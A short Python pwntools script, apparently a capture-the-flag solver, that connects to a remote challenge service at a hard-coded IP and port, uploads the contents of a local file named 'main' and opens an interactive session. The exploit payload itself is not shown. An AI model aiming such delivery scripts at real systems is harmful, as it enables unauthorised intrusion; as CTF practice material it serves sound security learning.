#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
if len(sys.argv) == 1:
    r=remote("ee",60001)
else:
    r=remote("52.198.163.80",31733)
with open("./main","r") as f:
    data=f.read()

r.sendlineafter("Length?\n",str(len(data)))
r.sendafter("Data?\n",data)

r.interactive()
